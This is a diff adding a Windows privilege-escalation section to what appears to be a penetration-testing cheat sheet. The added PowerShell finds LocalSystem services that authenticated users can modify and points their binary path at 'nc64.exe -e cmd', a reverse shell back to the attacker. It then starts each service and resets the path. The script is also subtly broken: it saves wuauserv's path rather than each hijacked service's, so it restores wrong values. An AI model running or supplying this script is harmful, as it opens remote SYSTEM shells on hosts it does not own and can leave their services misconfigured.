@@ -385,7 +385,30 @@ List all acl services
 ```
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *
 ```
-
+Loop through to find services run as localsystem
+```
+foreach ($service in $services) { 
+  $sddl = (cmd /c sc sdshow $service)[1]; 
+  $reg = gp -path hklm:\system\currentcontrolset\services\$service; 
+  if ($sddl -match "RP[A-Z]*?;;;AU" -and $reg.ObjectName -eq "LocalSystem") { 
+    write-host $service
+  }
+}
+```
+Automatically gets the old value for the service binary. Then it sets that path to nc.exe connecting back to me. It then starts the service, and the puts the original bin path back
+```
+foreach ($service in $services) { 
+  $sddl = (cmd /c sc sdshow $service)[1]; 
+  $reg = gp -path hklm:\system\currentcontrolset\services\$service; 
+  if ($sddl -match "RP[A-Z]*?;;;AU" -and $reg.ObjectName -eq "LocalSystem") { 
+    write-host "Trying to hijack $service"; 
+    $old_path = (get-itemproperty HKLM:\system\currentcontrolset\services\wuauserv).ImagePath; 
+    set-itemproperty -erroraction silentlycontinue -path HKLM:\system\currentcontrolset\services\$service -name imagepath -value "\windows\system32\spool\drivers\color\nc64.exe -e cmd ip port"; 
+    start-service $service -erroraction silentlycontinue; 
+    set-itemproperty -path HKLM:\system\currentcontrolset\services\$service -name imagepath -value $old_path 
+  }
+}
+```
 ### Linux
 ##### Directory Permissions
 >A directory is handled differently from a file. Read access gives the right to consult the list of its contents (files and directories). Write access allows creating or deleting files. Finally, execute access allows crossing through the directory to access its contents (using the cd command, for example).
